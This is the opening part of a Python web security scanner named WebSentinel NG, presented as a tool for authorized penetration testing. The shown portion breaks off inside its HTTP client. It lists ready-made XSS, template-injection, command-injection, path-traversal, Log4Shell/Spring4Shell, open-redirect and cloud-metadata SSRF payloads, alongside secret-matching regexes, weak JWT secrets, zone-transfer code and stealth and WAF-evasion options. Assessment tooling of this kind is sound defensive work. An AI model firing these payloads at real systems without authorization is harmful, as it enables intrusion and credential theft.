#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebSentinel NG v4.0 — Next-Generation Web Attack Surface Assessment Platform
==============================================================================

A SINGLE-FILE, STANDARD-LIBRARY web security assessment platform for
AUTHORIZED penetration testing, bug bounty and red-team operations.

WHY THIS IS DIFFERENT FROM A BASIC SCANNER
------------------------------------------
  * Hand-written async HTTP/1.1 client: keep-alive pool, chunked/gzip/deflate,
    redirects, persistent COOKIE JAR, HTTP proxy + CONNECT tunnelling,
    per-host concurrency limits, adaptive 429/503 back-off, stealth jitter,
    header-order randomisation and request caching.
  * Hand-written async DNS resolver (UDP + compression pointers) with
    A/AAAA/CNAME/MX/TXT/NS/ANY, AXFR zone-transfer attempts.
  * AUTHENTICATED SCANNING: login-form automation with automatic CSRF token
    discovery, session persistence, header/cookie/token injection, and
    optional Playwright-driven browser login for JS-heavy apps.
  * MULTI-TARGET operations from a file, JSON config-driven scope
    (include/exclude), per-target settings and resumable state files.
  * 40+ plugin modules across recon / discovery / vuln / post phases.
  * Offensive testing primitives: reflection, baseline/differential analysis,
    statistical time-based detection, error signatures, WAF-bypass payload
    transformations and a built-in OOB (HTTP + DNS) interaction server.
  * REAL-WORLD checks: Log4Shell/Spring4Shell, .git repository dumper-lite,
    cloud metadata & exposed Docker/K8s, framework debug modes, CSRF,
    OAuth redirect_uri bypass, file upload polyglots, race conditions,
    WebSocket discovery, CVE/version intelligence, subdomain takeover.
  * Reporting: CVSS v3.1, CWE, OWASP Top-10 2021, risk grade, EXECUTIVE
    SUMMARY, attack-surface map, exploit-chain hints, baseline DIFF
    (new/fixed), and JSON / HTML dashboard / CSV / SARIF 2.1.0 / Markdown /
    generated curl + HTML PoC files. CI-friendly --fail-on severity.

LEGAL: only scan systems you own or have explicit written authorization.
Active modules send hostile payloads and will be logged by targets/WAFs.

Quick start
  python web_sentinel.py --list-modules
  python web_sentinel.py https://target.tld --profile deep
  python web_sentinel.py --targets targets.txt --profile standard --json all.json
  python web_sentinel.py https://target.tld --config scope.json --oob
  python web_sentinel.py https://target.tld --login-url /login --user admin \\
      --pass 'Passw0rd!' --verify-login 'Dashboard' --profile deep
  python web_sentinel.py https://target.tld --profile deep --baseline prev.json \\
      --json now.json --html dashboard.html --poc-dir pocs --fail-on HIGH
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import collections
import contextlib
import csv
import datetime as dt
import difflib
import gzip
import hashlib
import hmac
import html
import importlib
import ipaddress
import json
import math
import os
import random
import re
import socket
import ssl
import struct
import sys
import time
import urllib.parse
import zlib
from dataclasses import dataclass, field, asdict
from html.parser import HTMLParser
from typing import Any, Awaitable, Callable, Dict, List, Optional, Sequence, Set, Tuple

for _s in (sys.stdout, sys.stderr):
    with contextlib.suppress(Exception):
        _s.reconfigure(encoding="utf-8", errors="replace")

VERSION = "4.0.0"
R, G, Y, B = "\033[91m", "\033[92m", "\033[93m", "\033[94m"
C, M, Z, BD = "\033[96m", "\033[95m", "\033[0m", "\033[1m"

SEV_RANK = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
SEV_CLR = {"INFO": C, "LOW": B, "MEDIUM": Y, "HIGH": R, "CRITICAL": M}
SEV_HEX = {"INFO": "#0dcaf0", "LOW": "#0d6efd", "MEDIUM": "#ffc107",
           "HIGH": "#dc3545", "CRITICAL": "#6f42c1"}

UAS = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
 "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
 "WebSentinel/4.0 (+authorized-assessment)",
]
TYPE_MAP = {"A":1,"NS":2,"CNAME":5,"SOA":6,"PTR":12,"MX":15,"TXT":16,
            "AAAA":28,"SRV":33,"AXFR":252,"ANY":255}

# --------------------------------------------------------------------------- #
#  Signatures / wordlists
# --------------------------------------------------------------------------- #

SQL_ERRORS = [r"sql syntax.*mysql", r"warning.*mysql", r"valid mysql result",
 r"postgresql.*error", r"ora-[0-9]{4,5}", r"microsoft odbc.*sql server",
 r"unclosed quotation mark", r"quoted string not properly terminated",
 r"sqlite.*error|sqlite3\.", r"java\.sql\.SQLException", r"org\.hibernate\.exception",
 r"syntax error.*near", r"PDOException", r"pg_query\(\)", r"MongoServerError",
 r"com\.mongodb\.MongoQueryException"]

XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>",
 "<img src=x onerror=alert(1)>", "';alert(1);//", "<body onload=alert(1)>",
 "<iframe srcdoc='<script>alert(1)</script>'>"]
SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{'a'*7}}",
 "{{config.items()}}", "${@java.lang.Runtime@getRuntime()}", "{7*7}"]
CMDI_PAYLOADS = ["; echo WSMARK", "| echo WSMARK", "&& echo WSMARK",
 "`echo WSMARK`", "$(echo WSMARK)", "; sleep 6 #", "| ping -c 6 127.0.0.1 #"]
LFI_PAYLOADS = ["../../../../etc/passwd", "..%2f..%2fetc%2fpasswd",
 "php://filter/convert.base64-encode/resource=index.php", "....//....//etc/passwd",
 "%2e%2e%2f%2e%2e%2fetc/passwd", "/etc/passwd%00", "data://text/plain;base64,PD9waHA=",
 "/proc/self/environ"]
REDIR_PAYLOADS = ["https://evil.example/x", "//evil.example", "///evil.example",
 "https:/\\evil.example", "/\\evil.example", "https://user@evil.example",
 "https://target.tld@evil.example", "%2f%2fevil.example"]

LOG4SHELL = ["${jndi:ldap://127.0.0.1:1389/a}", "${jndi:rmi://127.0.0.1:1099/a}",
 "${${lower:j}ndi:ldap://127.0.0.1:1389/b}", "${jndi:dns://127.0.0.1/a}"]
SPRINGSHELL = ["class.module.classLoader.URLs0=0=jdbc:${jndi:ldap://127.0.0.1:1389/s}",
 "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc%7Di"]

CLOUD_TARGETS = ["http://169.254.169.254/latest/meta-data/iam/security-credentials/",
 "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/",
 "http://169.254.169.254/metadata/v1/", "http://100.100.100.200/latest/meta-data/",
 "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO"]

DEBUG_SIGS = {
 "Django DEBUG": r"Django tried these URL patterns|DEBUG = True|django\.core\.handlers\.exception",
 "Laravel Ignition": r"Ignition|Whoops.*Laravel|Laravel framework",
 "Symfony Profiler": r"Symfony Profiler|_wdt|web-profiler-bundle",
 "PHPUnit": r"PHPUnit|phpunit", "ASP.NET trace": r"Trace Information|trace.axd",
 "Flask Debug": r"Werkzeug Debugger|pdb console|Flask Debug",
 "Rails Detailed Errors": r" Rails.*application trace|Showing.*where we went wrong",
 "Java stacktrace": r"java\.lang\.(NullPointerException|RuntimeException)",
}

TECH_SIGS = [
 ("PHP","header",r"PHPSESSID|X-Powered-By:\s*PHP"), ("ASP.NET","header",r"ASP\.NET_SessionId|X-AspNet"),
 ("JSP","header",r"JSESSIONID|Servlet"), ("Nginx","header",r"nginx"),
 ("Apache","header",r"Apache"), ("IIS","header",r"Microsoft-IIS"),
 ("Express","header",r"^Express|X-Powered-By:\s*Express"),
 ("WordPress","body",r"wp-content|wp-includes"), ("Joomla","body",r"/media/jui/"),
 ("Drupal","body",r"sites/default/files"), ("Magento","cookie",r"frontend=|mage-"),
 ("Django","cookie",r"csrftoken"), ("Laravel","cookie",r"laravel_session|XSRF-TOKEN"),
 ("Flask","cookie",r"session="), ("Rails","cookie",r"_rails"),
 ("React","body",r"__REACT_DEVTOOLS|react"), ("Vue","body",r"__VUE|vue"),
 ("Angular","body",r"ng-version|angular"), ("Next.js","body",r"__NEXT_DATA__|/_next/"),
 ("jQuery","body",r"jquery"), ("Bootstrap","body",r"bootstrap"),
 ("Spring Boot","body",r"Whitelabel Error Page|/actuator"),
 ("Struts","header",r"struts"), ("Log4j","body",r"log4j"),
]

# (tech, version-detection regex, vulnerable-version test, CVE, severity, title)
TECH_CVES = [
 ("jQuery", r"jquery[/-](\d+\.\d+\.\d+)", lambda a,b,c: (a,b)<(3,5,0),
  "CVE-2020-11022", "MEDIUM", "jQuery < 3.5.0 XSS via html()"),
 ("jQuery", r"jquery[/-](\d+\.\d+\.\d+)", lambda a,b,c: (a,b)<(3,4,0),
  "CVE-2019-11358", "MEDIUM", "jQuery < 3.4.0 prototype pollution"),
 ("Apache", r"Apache/(\d+\.\d+\.\d+)", lambda a,b,c: (a,b)==(2,4) and c<52,
  "CVE-2021-41773", "CRITICAL", "Apache 2.4 < 2.4.52 path traversal / RCE"),
 ("Nginx", r"nginx/(\d+\.\d+\.\d+)", lambda a,b,c: (a,b)==(1,18) and c<0,
  "CVE-2021-23017", "HIGH", "Nginx 1.18.0 DNS resolver off-by-one"),
 ("PHP", r"PHP/(\d+\.\d+\.\d+)", lambda a,b,c: (a,b)==(7,4) and c<0,
  "CVE-2021-21702", "HIGH", "Outdated PHP branch"),
 ("WordPress", r"wordpress[\s/-]*(\d+\.\d+(\.\d+)?)", lambda a,b,c: (a,b)<(6,0),
  "CVE-2023-5561", "MEDIUM", "Outdated WordPress core"),
 ("Struts", r"struts[/-](\d+\.\d+\.\d+)", lambda a,b,c: (a,b)==(2,5) and c<30,
  "CVE-2021-31805", "CRITICAL", "Apache Struts 2.5 < 2.5.30 OGNL RCE"),
]

WAF_SIGS = [
 ("Cloudflare","header",r"cloudflare|cf-ray"), ("Cloudflare","cookie",r"__cfduel|__cf_bm"),
 ("Akamai","header",r"akamai"), ("Imperva","header",r"incapsula|imperva|x-iinfo"),
 ("Imperva","cookie",r"incap_ses|visid_incap"), ("AWS WAF","header",r"x-amzn-waf"),
 ("ModSecurity","header",r"mod_security"), ("F5 ASM","cookie",r"TS[0-9a-f]{8}|BIGipServer"),
 ("Sucuri","header",r"sucuri"), ("Wordfence","header",r"wordfence|wfwaf"),
 ("FortiWeb","cookie",r"FSSBBIl1UgzbN7N"), ("Citrix","cookie",r"NSC_|nsvr_"),
]

SUB_WORDS = ["www","mail","ftp","smtp","pop","ns1","ns2","api","dev","test","staging",
 "stage","prod","admin","blog","shop","cdn","static","media","img","assets","css","js",
 "news","forum","support","help","docs","wiki","git","gitlab","vpn","cloud","beta",
 "alpha","demo","sandbox","mobile","m","app","secure","login","auth","sso","oauth",
 "portal","intranet","extranet","db","database","cache","redis","mq","elastic","kibana",
 "grafana","monitor","metrics","status","ci","jenkins","build","deploy","mx","web","owa"]

DIR_SMALL = ["", "admin", "login", "robots.txt", "sitemap.xml", ".env", ".git/HEAD",
 "wp-login.php", "phpmyadmin/", "api/", "config.php", "backup/", "uploads/"]
DIR_MED = DIR_SMALL + ["administrator/","logout","register","dashboard","favicon.ico",
 ".git/config",".svn/entries",".htaccess","wp-admin/","wp-config.php","xmlrpc.php",
 "api/v1/","swagger-ui.html","openapi.json","graphql","docs/","backup.sql","dump.sql",
 "static/","assets/","test/","dev/","staging/","README.md","console/","actuator/",
 "actuator/env","server-status","phpinfo.php","info.php","shell","cgi-bin/","metrics",
 "trace.axd","elmah.axd",".DS_Store","_wdt","wp-json/","api-docs","swagger/","graphiql"]

SENSITIVE_FILES = [".env",".env.local",".git/HEAD",".git/config","wp-config.php",
 "web.config","WEB-INF/web.xml","application.properties","application.yml",
 "credentials.json","id_rsa",".npmrc","backup.sql","dump.sql","passwords.txt",
 ".htaccess",".htpasswd","xmlrpc.php",".git/index",".git/logs/HEAD"]

SECRET_PATTERNS = {
 "AWS Key":r"AKIA[0-9A-Z]{16}", "GitHub Token":r"gh[pousr]_[A-Za-z0-9]{30,}",
 "Slack Token":r"xox[bpars]-[A-Za-z0-9-]{10,}", "Google API":r"AIza[A-Za-z0-9_\-]{35}",
 "JWT":r"eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}",
 "Private Key":r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----",
 "Stripe":r"[sr]k_(live|test)_[A-Za-z0-9]{20,}", "SendGrid":r"SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}",
 "DB URI":r"(mongodb|postgres(ql)?|mysql|redis)://[^\s'\"]+:[^\s'@]+@",
 "Generic API Key":r"(?i)(api[_-]?key|secret|token)\s*[:=]\s*['\"][A-Za-z0-9_\-]{20,}['\"]",
}

JWT_WEAK_SECRETS = ["secret","password","admin","test","key","123456","qwerty","changeme",
 "jwtsecret","supersecret","letmein","default","dev","webSentinel"]

# --------------------------------------------------------------------------- #
#  Utilities
# --------------------------------------------------------------------------- #

def sanitize(s: Any, n: int = 200) -> str:
    s = re.sub(r"\s+", " ", str(s or "")).strip()
    return s if len(s) <= n else s[: n - 3] + "..."

def b64u(d: bytes) -> str: return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
def b64ud(s: str) -> bytes: return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def murmur3_32(data: bytes, seed: int = 0) -> int:
    c1, c2 = 0xcc9e2d51, 0x1b873593
    h = seed & 0xffffffff
    n = len(data) // 4
    for i in range(n):
        k = int.from_bytes(data[i*4:i*4+4], "little")
        k = (k*c1)&0xffffffff; k = ((k<<15)|(k>>17))&0xffffffff; k = (k*c2)&0xffffffff
        h ^= k; h = ((h<<13)|(h>>19))&0xffffffff; h = (h*5+0xe6546b64)&0xffffffff
    tail = data[n*4:]
    if tail:
        k = 0
        for i, b in enumerate(tail): k |= b << (8*i)
        k = (k*c1)&0xffffffff; k = ((k<<15)|(k>>17))&0xffffffff; k = (k*c2)&0xffffffff
        h ^= k
    h ^= len(data); h ^= h>>16; h = (h*0x85ebca6b)&0xffffffff
    h ^= h>>13; h = (h*0xc2b2ae35)&0xffffffff; h ^= h>>16
    return h & 0xffffffff

def favicon_hash(data: bytes) -> int: return murmur3_32(base64.b64encode(data))

def similarity(a: str, b: str) -> float:
    if a == b: return 1.0
    if not a or not b: return 0.0
    if len(a) > 12000 or len(b) > 12000: a, b = a[:4000], b[:4000]
    return difflib.SequenceMatcher(None, a, b).ratio()

def entropy(s: str) -> float:
    if not s: return 0.0
    cnt = collections.Counter(s); n = len(s)
    return -sum((v/n)*math.log2(v/n) for v in cnt.values())

def roundup(x: float) -> float:
    import decimal
    return float(decimal.Decimal(str(x)).quantize(decimal.Decimal("0.1"), rounding=decimal.ROUND_CEILING))

def cvss_score(vector: str) -> float:
    try:
        p = dict(x.split(":",1) for x in vector.split("/") if ":" in x)
        av = {"N":.85,"A":.62,"L":.55,"P":.2}[p["AV"]]
        ac = {"L":.77,"H":.44}[p["AC"]]
        pr = ({"N":.85,"L":.62,"H":.27} if p.get("S")=="U" else {"N":.85,"L":.68,"H":.5})[p["PR"]]
        ui = {"N":.85,"R":.62}[p["UI"]]
        c = {"H":.56,"L":.22,"N":0}[p["C"]]; i = {"H":.56,"L":.22,"N":0}[p["I"]]
        a = {"H":.56,"L":.22,"N":0}[p["A"]]
        iss = 1-(1-c)*(1-i)*(1-a)
        imp = 6.42*iss if p.get("S")!="C" else 7.52*(iss-.029)-3.25*(iss-.02)**15
        exp = 8.22*av*ac*pr*ui
        if imp <= 0: return 0.0
        return roundup(min((1.08 if p.get("S")=="C" else 1)*(imp+exp), 10))
    except Exception: return 0.0

def sev_from_score(s: float) -> str:
    return "CRITICAL" if s>=9 else "HIGH" if s>=7 else "MEDIUM" if s>=4 else "LOW" if s>0 else "INFO"

def in_scope(cfg: "Config", url: str) -> bool:
    try: t = urllib.parse.urlsplit(url)
    except Exception: return False
    if t.scheme not in ("http","https","ws","wss") or not t.netloc: return False
    host = (t.hostname or "").lower()
    if cfg.scope_exclude and any(h in host for h in cfg.scope_exclude): return False
    if cfg.scope_include:
        return any(host == h or host.endswith("."+h) for h in cfg.scope_include)
    bh = (cfg.host or "").lower()
    return host == bh or (cfg.include_subs and host.endswith("."+bh))

def host_of(url: str) -> str: return urllib.parse.urlsplit(url).hostname or ""
def rand_ua(cfg: "Config") -> str: return random.choice(UAS) if cfg.stealth else cfg.user_agent

# --------------------------------------------------------------------------- #
#  Config + data models
# --------------------------------------------------------------------------- #

@dataclass
class Config:
    target: str = ""
    scheme: str = "https"
    host: str = ""
    port: Optional[int] = None
    profile: str = "standard"
    user_agent: str = f"WebSentinel/{VERSION} (+authorized-assessment)"
    threads: int = 16
    timeout: float = 8.0
    retries: int = 1
    rps: float = 0.0
    jitter: float = 0.0
    stealth: bool = False
    proxy: str = ""
    verify_tls: bool = True
    follow_redirects: bool = True
    respect_robots: bool = True
    include_subs: bool = False
    scope_include: List[str] = field(default_factory=list)
    scope_exclude: List[str] = field(default_factory=list)
    max_pages: int = 150
    max_depth: int = 3
    max_targets: int = 30
    payload_budget: int = 900
    wordlist: str = "medium"
    wordlist_file: str = ""
    modules: Optional[List[str]] = None
    exclude_modules: Set[str] = field(default_factory=set)
    ports: Optional[List[int]] = None
    extra_headers: Dict[str, str] = field(default_factory=dict)
    cookie_values: Dict[str, str] = field(default_factory=dict)
    # authentication
    login_url: str = ""
    username: str = ""
    password: str = ""
    user_field: str = "username"
    pass_field: str = "password"
    login_extra: Dict[str, str] = field(default_factory=dict)
    verify_login: str = ""
    logout_marker: str = "logout|sign out|signout"
    browser_login: bool = False
    # oob / state / output
    oob: bool = False
    oob_http_port: int = 8099
    oob_dns_port: int = 55353
    oob_domain: str = ""
    baseline: str = ""
    state_file: str = ""
    json_out: str = ""; html_out: str = ""; csv_out: str = ""
    sarif_out: str = ""; md_out: str = ""; poc_dir: str = ""
    fail_on: str = ""
    verbose: bool = False
    quiet: bool = False

PROFILES = {
 "quick": dict(threads=10,max_pages=40,max_depth=1,max_targets=8,payload_budget=150,
   wordlist="small", exclude={"ports","axfr","subdomains","whois","vhosts","smuggling","idor","takeover","browser","race"}),
 "standard": dict(threads=16,max_pages=120,max_depth=2,max_targets=20,payload_budget=600,
   wordlist="medium", exclude={"browser","race"}),
 "deep": dict(threads=24,max_pages=300,max_depth=4,max_targets=40,payload_budget=1600,
   wordlist="large", exclude={"race"}),
 "paranoid": dict(threads=32,max_pages=600,max_depth=6,max_targets=80,payload_budget=4000,
   wordlist="large", exclude=set(), stealth=True, jitter=0.4),
}

@dataclass
class Response:
    url: str
    status: Optional[int] = None
    reason: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    set_cookies: List[str] = field(default_factory=list)
    body: str = ""
    raw: bytes = b""
    elapsed_ms: float = 0.0
    final_url: str = ""
    history: List[Tuple[int, str]] = field(default_factory=list)
    error: str = ""
    def get(self, name: str, default: str = "") -> str:
        for k, v in self.headers.items():
            if k.lower() == name.lower(): return v
        return default
    @property
    def ok(self) -> bool: return self.status is not None and 200 <= self.status < 400

@dataclass
class Finding:
    severity: str
    category: str
    title: str
    detail: str = ""
    url: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe: str = ""
    owasp: str = ""
    vector: str = ""
    score: float = 0.0
    source: str = ""
    def __post_init__(self) -> None:
        if not self.score and self.vector: self.score = cvss_score(self.vector)
        if not self.cwe: self.cwe = CWE_MAP.get(self.category, "CWE-200")
        if not self.owasp: self.owasp = OWASP_MAP.get(self.category, "A05:2021-Security Misconfiguration")
    def to_dict(self) -> Dict[str, Any]: return asdict(self)

DEFAULT_VECTOR = {
 "CRITICAL":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
 "HIGH":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
 "MEDIUM":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
 "LOW":"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
 "INFO":"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:N",
}
OWASP_MAP = {
 "SQLi":"A03:2021-Injection","NoSQLi":"A03:2021-Injection","XSS":"A03:2021-Injection",
 "SSTI":"A03:2021-Injection","CMDi":"A03:2021-Injection","LFI":"A03:2021-Injection",
 "XXE":"A05:2021-Security Misconfiguration","SSRF":"A10:2021-SSRF",
 "Redirect":"A01:2021-Broken Access Control","IDOR":"A01:2021-Broken Access Control",
 "CORS":"A05:2021-Security Misconfiguration","JWT":"A07:2021-Identification and Authentication Failures",
 "Auth":"A07:2021-Identification and Authentication Failures","Headers":"A05:2021-Security Misconfiguration",
 "Cookies":"A05:2021-Security Misconfiguration","TLS":"A02:2021-Cryptographic Failures",
 "Crypto":"A02:2021-Cryptographic Failures","Sensitive":"A02:2021-Cryptographic Failures",
 "Secrets":"A02:2021-Cryptographic Failures","Deserial":"A08:2021-Software and Data Integrity Failures",
 "Prototype":"A08:2021-Software and Data Integrity Failures","Misconfig":"A05:2021-Security Misconfiguration",
 "GraphQL":"A03:2021-Injection","Smuggling":"A05:2021-Security Misconfiguration",
 "CSRF":"A01:2021-Broken Access Control","Upload":"A04:2021-Insecure Design",
 "CVE":"A06:2021-Vulnerable and Outdated Components","Cloud":"A05:2021-Security Misconfiguration",
 "OAuth":"A07:2021-Identification and Authentication Failures","Race":"A04:2021-Insecure Design",
}
CWE_MAP = {
 "SQLi":"CWE-89","NoSQLi":"CWE-943","XSS":"CWE-79","SSTI":"CWE-1336","CMDi":"CWE-78",
 "LFI":"CWE-22","XXE":"CWE-611","SSRF":"CWE-918","Redirect":"CWE-601","IDOR":"CWE-639",
 "CORS":"CWE-942","JWT":"CWE-347","Headers":"CWE-693","Cookies":"CWE-1004","TLS":"CWE-295",
 "Crypto":"CWE-327","Sensitive":"CWE-200","Secrets":"CWE-798","Deserial":"CWE-502",
 "Prototype":"CWE-1321","Misconfig":"CWE-16","GraphQL":"CWE-89","Smuggling":"CWE-444",
 "Auth":"CWE-287","CSRF":"CWE-352","Upload":"CWE-434","CVE":"CWE-1104","Cloud":"CWE-200",
 "OAuth":"CWE-601","Race":"CWE-362",
}

@dataclass
class Report:
    target: str
    started: str = field(default_factory=lambda: dt.datetime.now(dt.timezone.utc).isoformat())
    finished: str = ""
    findings: List[Finding] = field(default_factory=list)
    facts: Dict[str, Any] = field(default_factory=dict)
    pages: List[Dict[str, Any]] = field(default_factory=list)
    stats: Dict[str, Any] = field(default_factory=dict)
    _lock: Any = field(default_factory=asyncio.Lock, repr=False, compare=False)
    async def add(self, f: Finding) -> None:
        if not f.vector: f.vector = DEFAULT_VECTOR.get(f.severity, DEFAULT_VECTOR["INFO"])
        if not f.score: f.score = cvss_score(f.vector)
        async with self._lock: self.findings.append(f)
    async def fact(self, k: str, v: Any) -> None:
        async with self._lock: self.facts[k] = v
    def finalize(self) -> None:
        self.finished = dt.datetime.now(dt.timezone.utc).isoformat()
        seen = set(); uniq = []
        for f in self.findings:
            k = (f.category, f.title, f.url, f.evidence[:80])
            if k not in seen: seen.add(k); uniq.append(f)
        self.findings = sorted(uniq, key=lambda f: (f.score, SEV_RANK[f.severity]), reverse=True)
        by = collections.Counter(f.severity for f in self.findings)
        self.stats["by_severity"] = dict(by); self.stats["total"] = len(self.findings)
        score = sum({"CRITICAL":30,"HIGH":18,"MEDIUM":9,"LOW":4,"INFO":1}[f.severity] for f in self.findings)
        self.stats["risk_score"] = min(100, score)
        self.stats["grade"] = ("CRITICAL" if score>=75 else "HIGH" if score>=50 else
                               "MEDIUM" if score>=25 else "LOW" if score>0 else "CLEAN")
        self.stats["pages"] = len(self.pages)
        self.stats["max_cvss"] = max([f.score for f in self.findings] or [0])
    def to_dict(self) -> Dict[str, Any]:
        return {"target":self.target,"started":self.started,"finished":self.finished,
                "stats":self.stats,"facts":self.facts,"pages":self.pages,
                "findings":[f.to_dict() for f in self.findings]}

# --------------------------------------------------------------------------- #
#  Async DNS
# --------------------------------------------------------------------------- #

def _enc_name(name: str) -> bytes:
    out = b""
    for label in name.strip(".").split("."):
        if not label: continue
        try: b = label.encode("idna")
        except Exception: b = label.encode("utf-8", "replace")
        out += bytes([len(b)]) + b
    return out + b"\x00"

def _dec_name(data: bytes, off: int, depth: int = 0) -> Tuple[str, int]:
    if depth > 20: return "", off
    parts = []; jumped = False
    while True:
        if off >= len(data): break
        ln = data[off]
        if ln & 0xC0 == 0xC0:
            if not jumped: off += 2
            ptr = ((ln & 0x3F) << 8) | data[off]
            off += 1 if jumped else 0
            nm, _ = _dec_name(data, ptr, depth+1); parts.append(nm); jumped = True; break
        off += 1
        if ln == 0: break
        parts.append(data[off:off+ln].decode("utf-8","replace")); off += ln
        if jumped: break
    return ".".join(p for p in parts if p), off

class _DNSProto(asyncio.DatagramProtocol):
    def __init__(self, payload: bytes) -> None:
        self.payload = payload; self.data = b""
        self.done = asyncio.get_running_loop().create_future()
    def connection_made(self, t: Any) -> None: t.sendto(self.payload)
    def datagram_received(self, d: bytes, a: Any) -> None:
        self.data = d
        if not self.done.done(): self.done.set_result(True)
    def error_received(self, e: Any) -> None:
        if not self.done.done(): self.done.set_result(True)

class AsyncDNS:
    def __init__(self, cfg: Config) -> None:
        self.cfg = cfg; self.servers = ["1.1.1.1","8.8.8.8","9.9.9.9"]
        self.cache: Dict[Tuple[str,str], List[str]] = {}; self.lock = asyncio.Lock()
    async def query(self, name: str, rtype: str = "A", timeout: float = 3.0) -> List[str]:
        key = (name.lower(), rtype)
        if key in self.cache: return self.cache[key]
        pkt = struct.pack("!HHHHHH", random.randint(0,65535), 0x0100,1,0,0,0) + \
              _enc_name(name) + struct.pack("!HH", TYPE_MAP.get(rtype,1),1)
        answers: List[str] = []; loop = asyncio.get_running_loop()
        for srv in self.servers:
            try:
                tr, pr = await loop.create_datagram_endpoint(lambda: _DNSProto(pkt), remote_addr=(srv,53))
                with contextlib.suppress(asyncio.TimeoutError): await asyncio.wait_for(pr.done, timeout)
                tr.close()
                if pr.data:
                    answers = self._parse(pr.data)
                    if answers: break
            except Exception: continue
        if not answers and rtype in ("A","AAAA"):
            with contextlib.suppress(Exception):
                infos = await loop.run_in_executor(None, socket.getaddrinfo, name, None)
                answers = sorted({i[4][0] for i in infos})
        async with self.lock: self.cache[key] = answers
        return answers
    def _parse(self, data: bytes) -> List[str]:
        try:
            if len(data) < 12: return []
            qd, an = struct.unpack("!HH", data[4:8]); off = 12; out = []
            for _ in range(qd): _, off = _dec_name(data, off); off += 4
            for _ in range(an):
                _, off = _dec_name(data, off)
                if off+10 > len(data): break
                typ, cls, ttl, rdlen = struct.unpack("!HHIH", data[off:off+10]); off += 10
                rd = data[off:off+rdlen]; off += rdlen
                if typ==1 and len(rd)==4: out.append(socket.inet_ntoa(rd))
                elif typ==28 and len(rd)==16: out.append(socket.inet_ntop(socket.AF_INET6,rd))
                elif typ in (2,5,12):
                    n,_ = _dec_name(data, off-rdlen); out.append(n)
                elif typ==15 and len(rd)>2:
                    pref = struct.unpack("!H",rd[:2])[0]; n,_ = _dec_name(data,off-rdlen+2)
                    out.append(f"{pref} {n}")
                elif typ==16:
                    p = 0; parts=[]
                    while p < len(rd):
                        ln = rd[p]; p+=1; parts.append(rd[p:p+ln].decode("utf-8","replace")); p+=ln
                    out.append(" ".join(parts))
            return out
        except Exception: return []
    async def axfr(self, domain: str) -> List[str]:
        try:
            ns = await self.query(domain,"NS")
            if not ns: return []
            pkt = struct.pack("!HHHHHH", random.randint(0,65535),0x0200,1,0,0,0) + \
                  _enc_name(domain) + struct.pack("!HH",TYPE_MAP["AXFR"],1)
            r,w = await asyncio.wait_for(asyncio.open_connection(ns[0].rstrip("."),53), self.cfg.timeout)
            w.write(struct.pack("!H",len(pkt))+pkt); await w.drain()
            recs=[]
            with contextlib.suppress(Exception):
                while True:
                    hdr = await asyncio.wait_for(r.readexactly(2),4)
                    msg = await r.readexactly(struct.unpack("!H",hdr)[0])
                    part = self._parse(msg)
                    if not part: break
                    recs.extend(part)
                    if len(recs)>500: break
            w.close(); return recs
        except Exception: return []

# --------------------------------------------------------------------------- #
#  Async HTTP/1.1 client (cookies, proxy, adaptive throttling)
# --------------------------------------------------------------------------- #

class _Conn:
    __slots__ = ("reader","writer","key","used")
    def __init__(self, r: Any, w: Any, key: Tuple[Any, ...]) -> None:
        self.reader=r; self.writer=w; self.key=key; self.used=time.time()

class AsyncHTTP:
    def __init__(self, cfg: Config) -> None:
        self.cfg=cfg
        self.pool: Dict[Tuple[Any,...],asyncio.Queue] = collections.defaultdict(asyncio.Queue)
        self.sems: Dict[Tuple[Any,...],asyncio.Semaphore] = {}
        self.last: Dict[Tuple[Any,...],float] = {}
        self.penalty: Dict[Tuple[Any,...],float] = {}
        self.cookies: Dict[str,Dict[str,str]] = collections.defaultdict(dict)
        self.cache: Dict[Tuple[Any,...],Response] = {}
        self.count = 0; self.lock = asyncio.Lock()

    def _sem(self, key: Tuple[Any,...]) -> asyncio.Semaphore:
        if key not in self.sems: self.sems[key] = asyncio.Semaphore(self.cfg.threads)
        return self.sems[key]

    def set_cookie(self, domain: str, name: str, value: str) -> None:
        self.cookies[domain.lower()][name] = value

    def cookie_header(self, host: str) -> str:
        parts=[]
        for dom, cks in self.cookies.items():
            if host == dom or host.endswith("."+dom):
                parts.extend(f"{k}={v}" for k,v in cks.items())
        return "; ".join(parts)

    async def _open(self, host: str, port: int, tls: bool, key: Tuple[Any,...]) -> _Conn:
        ctx = None
        if tls:
            ctx = ssl.create_default_context()
            if not self.cfg.verify_tls:
                ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        if self.cfg.proxy:
            try:
